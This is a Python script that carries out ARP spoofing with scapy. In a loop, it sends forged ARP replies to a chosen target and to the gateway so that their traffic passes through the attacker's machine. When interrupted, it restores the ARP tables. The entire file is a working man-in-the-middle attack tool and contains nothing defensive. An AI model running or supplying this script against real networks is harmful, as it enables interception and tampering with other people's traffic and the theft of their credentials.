#!/usr/bin/env python

import optparse 
import time
import sys

from mac import * 

def spoof(target_ip, spoof_ip):
    print(target_ip)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)


def run(target,gateway):
    sent_packets_count = 0

    try:
        while True:
            #spoofing target
            spoof(target, gateway)
            #spoofing router
            spoof(gateway, target)
            sent_packets_count += 2
            print("\r[+] Packets sent: " + str(sent_packets_count)),
            # time.sleep(1)
            # Python 3
            #print("\r[+] Packets sent: " + str(sent_packets_count), end = "")
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C ......... Resetting ARP tables..... Please wait......")
        restore(target, gateway)
        restore(gateway, target)